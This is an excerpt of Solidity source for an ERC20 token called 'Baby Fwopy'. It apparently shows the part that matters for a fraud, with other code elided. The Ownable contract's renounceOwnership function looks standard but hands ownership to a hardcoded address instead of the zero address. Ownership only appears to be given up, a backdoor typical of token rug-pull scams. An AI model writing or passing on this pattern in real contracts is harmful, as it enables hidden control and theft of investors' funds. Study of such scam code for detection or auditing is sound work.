...
contract Ownable is Context {
    ...
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x1f92DdA82cE5dde2E5C901593835adcc9982D89b));
        _owner = address(0x1f92DdA82cE5dde2E5C901593835adcc9982D89b);
    }
...
contract BabyFwopy is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("Baby Fwopy", "Fwopy") {
        ...
        marketingAddress = 0x2cfd36853b0546Fa1513D36AE5a6a1fbfb0605a3;
